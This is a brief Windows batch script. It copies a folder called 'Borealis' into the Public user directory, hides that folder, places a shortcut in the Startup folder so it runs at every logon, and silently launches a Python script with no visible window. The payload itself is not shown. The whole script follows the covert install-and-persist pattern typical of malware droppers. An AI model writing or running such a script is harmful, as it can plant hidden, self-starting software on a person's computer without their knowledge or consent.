set "sourceFolder=Borealis"
set "destinationFolder=C:\Users\Public\Borealis"
xcopy "%sourceFolder%" "%destinationFolder%\" /E /I /Y
C:
attrib +h C:\Users\Public\Borealis
cd C:\Users\Public\Borealis
copy "%destinationFolder%\borealis.lnk" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
start "" cmd /c "pythonw borealis.pyw"